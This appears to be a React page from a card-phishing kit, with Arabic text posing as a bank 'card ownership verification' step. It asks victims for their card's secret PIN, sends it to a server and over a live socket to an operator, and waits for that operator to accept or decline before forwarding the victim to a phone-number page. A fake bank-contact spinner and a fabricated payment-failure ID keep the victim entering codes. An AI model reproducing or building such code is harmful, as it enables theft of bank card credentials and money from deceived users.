import React, { useState } from "react";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { serverRoute, socket } from "./Home";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
const Pin = () => {
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  const query = new URLSearchParams(window.location.search);
  const data = query.get("data");
  const handlePin = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    const { _id } = JSON.parse(data);
    try {
      await axios
        .post(serverRoute + "/visaPin/" + _id, {
          pin,
        })
        .then(() => {
          socket.emit("visaPin", {
            id: _id,
            pin,
          });
  
        });
    } catch (error) {
        console.log(error)
      setLoading(false);
    } finally {
    }
  };
  socket.on("acceptVisaPin", (id) => {
    if (id === JSON.parse(data)._id) {
      setLoading(false);
      window.location.href =
        "/phone?data=" +
        JSON.stringify({
          ...JSON.parse(data),
          pin,
        });
    }
  });

  socket.on("declineVisaPin", (id) => {
    if (id === JSON.parse(data)._id) {
      setLoading(false);
      setError(` رمز اثبات الملكيه خاطئ`);
    }
  });
  return (
    <div className="w-full flex items-center justify-center">
      {loading && (
        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-white  ">
          <TailSpin
            height="50"
            width="50"
            color="green"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
          <span className="text-xl my-5 text-green-600">
            جاري التواصل مع مصدر البنك
          </span>
        </div>
      )}
      <div className="w-full  lg:w-1/2 flex flex-col items-center justify-center  rounded-md">
        <form
          className="bg-white border  border-gray-300 rounded-md  p-3 py-10 text-sm w-full"
          dir="rtl"
          onSubmit={handlePin}
        >
          <div className="w-full flex justify-center items-center bg-[#242f65]">
            <img src="/nav.png" className="w-1/3" />
          </div>
          <h2 className="font-bold text-2xl my-2 w-full text-center  ">
            تأكيد ملكية البطاقة
          </h2>
          <p className="py-2 text-xs font-bold text-gray-500">
            لضمان حماية معلوماتك وإتمام عملية الدفع بأمان، نرجو منك إدخال الرمز
            السري المكون من ٤ أرقام، يُستخدم هذا الرمز فقط لأغراض التحقق من
            ملكية البطاقة
          </p>
          <div className="flex justify-center py-1 items-center gap-x-2 w-full flex-col ">
            <span className="text-[#626262] text-sm font-bold  w-full">
              أدخل الرمز هنا :{" "}
            </span>
            <input
              value={pin}
              required
              onChange={(e) => setPin(e.target.value)}
              dir="ltr"
              maxLength={6}
              minLength={4}
              inputMode="numeric"
              type="text"
              className="border px-3 py-1  border-gray-300 text-base text-center outline-[#ffc107] rounded-md w-full"
            />
          </div>

          {error ? (
            <div className="w-full text-center text-red-500  absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
              <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3">
                <AiOutlineCloseCircle className="text-6xl" />
                <div className="flex flex-col w-full items-center justify-center">
                  <span>نتيجة الدفع فشل معرف الدفع </span>
                  <span>82A27833M4589370G</span>
                </div>
                <button
                  className="bg-gray-900 text-white w-11/12 py-3"
                  onClick={() => setError(false)}
                >
                  حاول مرة ثانية
                </button>
              </div>
            </div>
          ) : (
            ""
          )}

          <div className="w-full flex items-center justify-center py-5">
            {" "}
            <button
              className="  px-5 flex justify-center items-center py-2  bg-[#007bff] text-white w-full rounded-md "
              type="submit"
            >
              تأكيد
            </button>
          </div>
          <span className="text-[#626262] text-sm font-bold  w-full">
            هل تحتاج إلي مساعدة ؟
          </span>
        </form>
      </div>
      {error ? (
        <div className="w-full text-center text-red-500  absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
          <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3">
            <span>حدث خطآ في رمز التوثيق </span>
            <AiOutlineCloseCircle
              className="text-6xl"
              onClick={() => setError(null)}
            />
            <div className="flex flex-col w-full items-center justify-center">
              {error}
            </div>
            <button
              className="bg-gray-900 text-white w-11/12 py-3"
              onClick={() => setError(null)}
            >
              حاول مرة ثانية
            </button>
          </div>
        </div>
      ) : (
        ""
      )}
    </div>
  );
};

export default Pin;
